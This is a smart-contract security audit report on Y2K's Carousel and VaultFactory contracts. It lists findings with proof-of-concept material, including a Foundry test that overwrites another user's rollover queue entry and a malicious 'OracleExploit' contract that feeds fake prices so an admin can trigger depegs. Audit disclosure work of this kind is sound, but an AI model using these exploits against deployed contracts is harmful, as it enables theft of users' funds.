# H-02  Users can overwrite RolloverQueue data of other users:  Carousel.sol

## Summary
The contract `Carousel.sol` implements a rollover queue that allows users to enlist in the queue and a controller to roll the user's hedge position over into the next epoch. A high severity vulnerability has been identified in the contract that allows other users to overwrite the struct data in the rollover queue due to a miscalculation of the rollover queue index. This vulnerability exposes users' rollover queue positions to manipulation and potential loss of funds, significantly undermining the security and integrity of the contract.

## Vulnerability Detail


```solidity
function enlistInRollover( uint256 _epochId, uint256 _assets, address _receiver) public epochIdExists(_epochId) minRequiredDeposit(_assets) {
    // [...] check approval and balances
    if (ownerToRollOverQueueIndex[_receiver] != 0) {
        // DANGEROUS! @audit if function is called, the rollOverQueue data is updated at this index.
        uint256 index = getRolloverIndex(_receiver); 
        rolloverQueue[index].assets = _assets;
        rolloverQueue[index].epochId = _epochId;
    } else {
       // @audit first time function is called, the user's QueueItem is pushed into rollOverQueue
        rolloverQueue.push(QueueItem({ assets: _assets, receiver: _receiver, epochId: _epochId }) );
    }
    
    // @audit !BUG! ownerToRollOverQueueIndex is ALWAYS updated to be rolloverQueue.length;
    ownerToRollOverQueueIndex[_receiver] = rolloverQueue.length; 
    
    //...

}
```

A malicious user can manipulate the index. getRolloverIndex will thus not returning the correct queue index position

```solidity
function getRolloverIndex(address _owner) public view returns (uint256) {
      return ownerToRollOverQueueIndex[_owner] - 1;
}
```
https://github.com/sherlock-audit/2023-03-Y2K/blob/main/Earthquake/src/v2/Carousel/Carousel.sol#L621-L623


### Step by Step

0) 
rolloverQueue is empty

1)  Attacker enlists:
```solidity
vault.enlistInRollover(_epochId, 3 ether, ATTACKER);
```

exec: https://github.com/sherlock-audit/2023-03-Y2K/blob/main/Earthquake/src/v2/Carousel/Carousel.sol#L260-L266

```txt
rolloverQueue.length = 1
ownerToRollOverQueueIndex[ATTACKER] = 1
getRolloverIndex(ATTACKER) = 0
```



2) Normal User enlists:
 ```solidity
vault.enlistInRollover(_epochId, 2 ether, USER);
```

exec: https://github.com/sherlock-audit/2023-03-Y2K/blob/main/Earthquake/src/v2/Carousel/Carousel.sol#L260-L266

```solidity
rolloverQueue.length = 2
ownerToRollOverQueueIndex[USER] = 2
getRolloverIndex(USER) = 1
```



3) Victim enlists:
```solidity
vault.enlistInRollover(_epochId, 99999 ether, VICTIM);
```

exec: https://github.com/sherlock-audit/2023-03-Y2K/blob/main/Earthquake/src/v2/Carousel/Carousel.sol#L260-L266

```solidity
rolloverQueue.length = 3
ownerToRollOverQueueIndex[VICTIM] = 3
getRolloverIndex(VICTIM) = 2
```

4) Attacker re-enlists
```solidity
vault.enlistInRollover(_epochId, 3 ether, ATTACKER);
```

Since ATTACKER is already in the queue. the function executes:
https://github.com/sherlock-audit/2023-03-Y2K/blob/main/Earthquake/src/v2/Carousel/Carousel.sol#L253-L258
```solidity
rolloverQueue.length = 3
ownerToRollOverQueueIndex[ATTACKER] = 1
getRolloverIndex(ATTACKER) = 0 // this is correct and behaves as expected.
```

Now Line 268 is executed:
https://github.com/sherlock-audit/2023-03-Y2K/blob/main/Earthquake/src/v2/Carousel/Carousel.sol#L268

But since `rolloverQueue.length = 3` => 
`ownerToRollOverQueueIndex[ATTACKER] = 3`


5) attacker re-enlists again (Exploit)
```solidity
vault.enlistInRollover(_epochId, 0.1 ether, ATTACKER); // low rollover value
```
Since ATTACKER is already in the queue. the function executes:
https://github.com/sherlock-audit/2023-03-Y2K/blob/main/Earthquake/src/v2/Carousel/Carousel.sol#L253-L258


rolloverQueue[index] is now pointing to the queue data of user: VICTIM.
Any write's to this storage will overwrite VICTIMs data:

```solidity
rolloverQueue[index].assets = _assets; // overwrite
rolloverQueue[index].epochId = _epochId; // overwrite
```


## Impact
Unauthorized Data Manipulation: The miscalculation of the rollover queue index enables other users to overwrite the struct data in the queue, allowing unauthorized manipulation of users' hedge positions.
Potential Loss of Funds: The vulnerability exposes users to potential loss of funds, as malicious actors can manipulate the rollover queue to their advantage, adversely affecting other users' positions.
Compromised Contract Security and Integrity: The vulnerability undermines the security and integrity of the smart contract, eroding user confidence and potentially rendering the contract unfit for its intended purpose.


## Code Snippet

```solidity
function testAttackEnListInRollover() public {
        // create two epochs
        uint40 _epochBegin = uint40(block.timestamp + 1 days);
        uint40 _epochEnd = uint40(block.timestamp + 2 days);
        uint256 _epochId = 2;
        uint256 _emissions = 100 ether;

        deal(emissionsToken, address(vault), 100 ether, true);
        vault.setEpoch(_epochBegin, _epochEnd, _epochId);
        vault.setEmissions(_epochId, _emissions);

        helperDepositInEpochs(_epochId, USER, false, 10 ether);
        helperDepositInEpochs(_epochId, USER2, false);
        helperDepositInEpochs(_epochId, USER3, false, 3 ether);
        helperDepositInEpochs(_epochId, USER4, false);

        vm.warp(_epochBegin - 10 minutes);

        helperDepositInEpochs(_epochId, USER, false, 10 ether);
        helperDepositInEpochs(_epochId, USER2, false);
        helperDepositInEpochs(_epochId, USER3, false, 3 ether);
        helperDepositInEpochs(_epochId, USER4, false);

        vm.prank(USER);
        vault.enlistInRollover(_epochId, 3 ether, USER);

        // enlist in rollover for next epoch
        vm.prank(USER2);
        //_epochId == epoch user is depositing in / amount of shares he wants to rollover
        vault.enlistInRollover(_epochId, 2 ether, USER2);

        vm.prank(USER3);
        vault.enlistInRollover(_epochId, 3 ether, USER3);

        vm.startPrank(USER);
        vault.enlistInRollover(_epochId, 3 ether, USER);
        vault.enlistInRollover(_epochId, 0.1 ether, USER); // <- overwrite USER #3 rollover amount
        vm.stopPrank();

        vm.startPrank(USER4);
        vault.enlistInRollover(_epochId, 2 ether, USER4);
        vault.enlistInRollover(_epochId, 2 ether, USER4);
        vm.stopPrank();

        vm.prank(USER2);
        vault.delistInRollover(USER2);

        // vm.prank(USER);
        // vault.delistInRollover(USER);

        // resolve first epoch
        vm.warp(_epochEnd + 1 days);
        vm.startPrank(controller);
        vault.resolveEpoch(_epochId);
        vm.stopPrank();

        // create second epoch
        _epochBegin = uint40(block.timestamp + 1 days);
        _epochEnd = uint40(block.timestamp + 2 days);
        _epochId = 3;
        _emissions = 100 ether;

        deal(emissionsToken, address(vault), 100 ether, true);
        vault.setEpoch(_epochBegin, _epochEnd, _epochId);
        vault.setEmissions(_epochId, _emissions);

        vm.startPrank(relayer);
        vault.mintRollovers(_epochId, 1);
        vm.stopPrank();

        // assertEq(vault.rolloverAccounting(_epochId), 0);

        // simulate prev epoch win
        stdstore.target(address(vault)).sig("claimTVL(uint256)").with_key(2).checked_write(1000 ether);

        // resolve second epoch
        // let relayer rollover for user
        vm.startPrank(relayer);
        vault.mintRollovers(_epochId, 5000); // can only mint 1 as queue length is 1
        vm.stopPrank();

        // assertEq(vault.rolloverAccounting(_epochId), 1);
    }
```


## Tool used

Manual Review

## Recommendation

1. Review and correct the logic for calculating the rollover queue index to ensure that it accurately reflects each user's position in the queue, preventing unauthorized overwriting of struct data.
2. Implement access control mechanisms to restrict the ability to modify rollover queue data to the appropriate users and the controller, further reducing the risk of unauthorized manipulation.
3. Develop comprehensive automated tests to verify the correct behavior of the rollover queue functionality and index calculation. This will help identify potential vulnerabilities early in the development process and minimize the risk of future issues. Consider using formal verification techniques to further validate the contract's security and correctness.


# H-02 Admin can steal funds from users by supplying arbitrary insured token

## Summary
Y2K allows the admin to supply both the oracle address and the address of the insured ERC-20 contract. However, the contract does not validate these addresses, creating a vulnerability that can be exploited by a malicious admin to alter the outcome of the hedge and steal users' funds. This issue represents a severe security vulnerability that exposes users to financial risks, undermines the contract's trustworthiness, and potentially renders the contract unfit for its intended purpose.

A malicious acting admin could configure a new market, with any ERC20 token as the ensured asset and name it like a legitimate asset: i.e. "USDC".

This would both break the accuracy of the pricing oracle, but also poison the collection of available markets with a name that is easy to be confused by the user.

Note: The engagement scope defines following assumption: `Admin Should not be able to steal user funds`



## Vulnerability Detail

The Y2K dapp is heavily relying on TheGraph GraphQL API: api.thegraph.com/subgraphs/name/y2k-finance/earthquake-abritrum. It plausible that the names of markets shown in the dapp result from TheGraph data. 

https://github.com/sherlock-audit/2023-03-Y2K/blob/main/Earthquake/src/v2/VaultFactoryV2.sol#L58

This enables an admin to create markets with arbitrary names, that could trick user's to deposit into a vault that does not represent the actual asset name.

```solidity
   emit MarketCreated(
            marketId,
            premium,
            collateral,
            _marketCalldata.underlyingAsset,
            _marketCalldata.token,
            _marketCalldata.name, // admin supplied name
            _marketCalldata.strike,
            _marketCalldata.controller
        );
```

Y2K has no function to remove marketIds


## Impact
Phishing
Loss of Funds

## Code Snippet

## Tool used

Manual Review

## Recommendation
Asset addresses should be whitelisted by TimeLock / DAO.
Names should be derived from IERC20.name()

zeroknots

high

# H-03 Admin can steal funds from users by manipulating price oracle

## Summary
The Y2K protocol is placing extensive trust on external price oracles. Y2k execute business logic such as depegs and vault balancing based on price signals from these oracles.

Y2k allows the admin to supply both the oracle address and the address of the insured ERC-20 contract. However, the contract does not validate these addresses, creating a vulnerability that can be exploited by a malicious admin to alter the outcome of the hedge bet and steal users' funds. This issue represents a severe security vulnerability that exposes users to financial risks, undermines the contract's trustworthiness, and potentially renders the contract unfit for its intended purpose.

A maliciously acting admin, could configure a new market with a manipulated oracle contract address and manipulate the outcome the vault's hedge position and thus rig the outcome of an epoch and drain users funds.

The protocol is designed to allow an Admin-EOA to configure new markets and epochs on those markets.
The engagement scope defines following assumption: **Admin Should not be able to steal user funds**


## Vulnerability Detail
When creating new markets, no validation or checks against trusted price oracles is performed:

https://github.com/sherlock-audit/2023-03-Y2K/blob/main/Earthquake/src/v2/VaultFactoryV2.sol#L58-L74

A maliciously acting admin, could configure a new market with a **malicious** oracle contract that the admin controls.
The admin can invest himself into a vault and bet against unexpecting Y2K users.
At the end of the epoch, the admin manipulates the oracle contract in such a way, that it signals a severely broken peg.

The admin can then call triggerDepeg() on the controller, and collect a massive premium.
https://github.com/sherlock-audit/2023-03-Y2K/blob/main/Earthquake/src/v2/Controllers/ControllerPeggedAssetV2.sol#L51-L62

ControllerPeggedAssetV2.sol Line 62 `int256 price = getLatestPrice(premiumVault.token());` is in complete control of the admin.


## Impact
Loss of user funds 
Reputation Damage

## Code Snippet

Exploit Contract:
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
contract OracleExploit is AggregatorV3Interface {
    AggregatorV3Interface public realOracle;


    struct OraclePriceFeed {
        bool enabled;
        uint80 roundId;
        int256 answer;
        uint256 startedAt;
        uint256 updatedAt;
        uint80 answeredInRound;
    }

    OraclePriceFeed pwned;

    constructor(address _oracle) {
        realOracle = AggregatorV3Interface(_oracle);
    }

    function setPwned(OraclePriceFeed calldata _data) public {
        pwned = _data;
    }

    function decimals() external view override returns (uint8) {
        return realOracle.decimals();
    }

    function description() external view override returns (string memory) {
        return realOracle.description();
    }

    function version() external view override returns (uint256) {
        return realOracle.version();
    }

    function getRoundData(uint80 _roundId)
        external
        view
        override
        returns (uint80 roundId, int256 answer, uint256 startedAt, uint256 updatedAt, uint80 answeredInRound)
    {
        if (pwned.enabled) {
            return (pwned.roundId, pwned.answer, pwned.startedAt, pwned.updatedAt, pwned.answeredInRound);
        } else {
            return realOracle.getRoundData(_roundId);
        }
    }

    function latestRoundData()
        external
        view
        override
        returns (uint80 roundId, int256 answer, uint256 startedAt, uint256 updatedAt, uint80 answeredInRound)
    {
        if (pwned.enabled) {
            return (pwned.roundId, pwned.answer, pwned.startedAt, pwned.updatedAt, pwned.answeredInRound);
        } else {
            return realOracle.latestRoundData();
        }
    }
}
```

## Tool used

Manual Review

## Recommendation
Since Y2K is placing so much trust on oracles, adequate validation processes such as whitelisting via the TimeLock should be implemented





# M-01 Incomplete ERC1155 Compliance Due to Missing safeBatchTransferFrom Function

## Summary
The smart contract under audit, written in Solidity, is intended to be fully compliant with the ERC1155 token standard. The Y2K scope explicitly that contracts must comply with ERC1155 standard.

However, it lacks the implementation of the essential function safeBatchTransferFrom, which is required for full compliance. This omission can lead to compatibility issues with other contracts, systems, or tools that expect the audited contract to fully adhere to the ERC1155 standard. The absence of safeBatchTransferFrom impacts the contract's functionality and usability, and may result in unexpected behavior or reduced efficiency when managing multiple token transfers simultaneously.

Carousel.sol fails to comply with IERC1155-safeBatchTransferFrom

## Vulnerability Details

Carousel.sol does not implement IERC1155-safeBatchTransferFrom
https://github.com/sherlock-audit/2023-03-Y2K/blob/main/Earthquake/src/v2/Carousel/Carousel.sol#L218-L226

Standard specifically states:
```txt
MUST emit `TransferSingle` or `TransferBatch` event(s) such that all the balance changes are reflected (see "Safe Transfer Rules" section of the standard).
        Balance changes and events MUST follow the ordering of the arrays (_ids[0]/_values[0] before _ids[1]/_values[1], etc).
        After the above conditions for the transfer(s) in the batch are met, this function MUST check if `_to` is a smart contract (e.g. code size > 0). If so, it MUST call the relevant `ERC1155TokenReceiver` hook(s) on `_to` and act appropriately (see "Safe Transfer Rules" section of the standard).                      
```
Carousel.sol does not comply with ERC1155.


## Impact
Compatibility Issues: The contract's lack of full compliance with the ERC1155 standard may result in compatibility problems when interacting with other contracts, systems, or tools that expect complete adherence to the standard.
Loss of Functionality: The absence of the safeBatchTransferFrom function hinders the contract's ability to efficiently manage multiple token transfers simultaneously, resulting in decreased functionality.
Reduced Usability: Users may find it difficult to use the contract in conjunction with other ERC1155-compliant systems, as the missing function could lead to unexpected behavior or require manual adjustments in the code.

## Code Snippet

## Tool used

Manual Review

## Recommendation

Implement the safeBatchTransferFrom function to ensure full compliance with the ERC1155 token standard. This will help to prevent compatibility issues, maintain the intended functionality, and improve the contract's usability with other systems.
Conduct a thorough review of the ERC1155 standard and cross-check the contract's implementation to ensure that all required functions and features are present and correctly implemented.
Implement comprehensive automated tests to validate the contract's compliance with the ERC1155 standard, including tests specifically designed to verify the correct behavior of the safeBatchTransferFrom function. This will help to identify any compliance issues early in the development process and minimize the risk of future vulnerabilities.



# M-02 Mismatch Interface and Code: ICarousel.sol

## Summary
The smart contract audited, written in Solidity, contains an interface definition with incorrect spelling or missing in the function names compared to the actual implementation.

This discrepancy results in different function signatures, which in turn leads to integration failures when attempting to use the interface with other contracts or systems. This issue constitutes a functional vulnerability that can hinder the correct operation of the smart contract and limit its usability, potentially causing loss of functionality and undermining user confidence in the contract.

## Vulnerability Detail

ICarousel.sol is missing or misspelling several function definitions implemented by Carousel.sol

https://github.com/sherlock-audit/2023-03-Y2K/blob/main/Earthquake/src/v2/interfaces/ICarousel.sol#L4

missing functions:
```solidity
    // @audit no deposit() function

    //@audit no withdraw() function

    //@audit no safeTransferFrom() function
```

misspelled functions:
```solidity
    // @audit typo. should be "enlistInRollover"
    function enListInRollover(uint256 _assets, uint256 _epochId, address _receiver) external;

    // @audit typo. should be "delistInRollover"
    function deListInRollover(address _receiver) external;

```

## Impact

Integration Failure: Contracts or systems attempting to interact with the audited contract through the interface will fail due to the discrepancy in function signatures.
Loss of Functionality: The incorrect function signatures can prevent the contract from performing its intended operations when interacting with other contracts or systems, rendering it less effective.
Reduced Usability: Users may find it difficult to use the contract, as the incorrect interface definition could lead to unexpected behavior or require manual adjustments in the code.

## Code Snippet


## Tool used

Manual Review

## Recommendation

Correct the spelling errors in the interface definition to match the actual implementation. Ensure that the function names and their respective signatures are consistent across both the interface and implementation. This will help to prevent integration issues and preserve the intended functionality.


Implement automated testing to catch any discrepancies in function signatures between the interface and implementation, reducing the likelihood of future vulnerabilities.


Consider using a linter or other code quality tools to identify and correct typographical errors and maintain code quality. This will help to prevent future instances of such issues and improve the overall robustness of the smart contract



# M-03 Insufficient Validation of Epoch Timestamps Leads to Potential Misconfiguration

## Summary
The Vault Factories do not validate the timestamps of epochs provided by the administrative user. Consequently, it is possible for the _epochEnd timestamp to be earlier than the _epochBegin timestamp, or for the epoch to have an extremely short duration. This issue constitutes a misconfiguration vulnerability, which could lead to unintended behavior, incorrect processing of data within the contract, and potential disruption of the contract's functionality.


## Vulnerability Detail

https://github.com/sherlock-audit/2023-03-Y2K/blob/main/Earthquake/src/v2/VaultFactoryV2.sol#L137-L156

## Impact
1. Unintended Behavior: The lack of validation for epoch timestamps can result in epochs with illogical configurations, which may lead to unexpected behavior within the contract and negatively affect its operation.
2. Incorrect Data Processing: If epochs are not correctly configured, the contract may process data inaccurately or inefficiently, potentially affecting the performance and reliability of the contract.
3. Disruption of Contract Functionality: The improper configuration of epochs can cause disruptions in the contract's functionality, undermining user confidence and potentially rendering the contract unusable for its intended purpose.


## Code Snippet


```solidity
    /**
     * @notice Function set epoch for market,
     * @param  _marketId uint256 of the market index to create more assets in
     * @param  _epochBegin uint40 in UNIX timestamp, representing the begin date of the epoch. Example: Epoch begins in 31/May/2022 at 00h 00min 00sec: 1654038000
     * @param  _epochEnd uint40 in UNIX timestamp, representing the end date of the epoch and also the ID for the minting functions. Example: Epoch ends in 30th June 2022 at 00h 00min 00sec: 1656630000
     * @param _withdrawalFee uint16 of the fee value, multiply your % value by 10, Example: if you want fee of 0.5% , insert 5
     */
    function createEpoch(uint256 _marketId, uint40 _epochBegin, uint40 _epochEnd, uint16 _withdrawalFee)
        public
        onlyOwner
        returns (uint256 epochId, address[2] memory vaults)
    {
```

## Tool used

Manual Review

## Recommendation

1. Implement validation checks for the _epochBegin and _epochEnd timestamps to ensure that the _epochEnd timestamp is always greater than the _epochBegin timestamp. This will help prevent the creation of illogical epoch configurations and maintain the contract's intended behavior.
2. Introduce a minimum epoch duration to prevent extremely short epochs that could negatively impact the contract's performance and functionality. Ensure that this minimum duration is carefully considered based on the specific use case and requirements of the contract.
3. Implement automated tests to verify the correct validation of epoch timestamps and configurations. This will help identify potential misconfiguration issues early in the development process and reduce the risk of future vulnerabilities. Additionally, consider using formal verification techniques to further strengthen the validation of contract parameters.
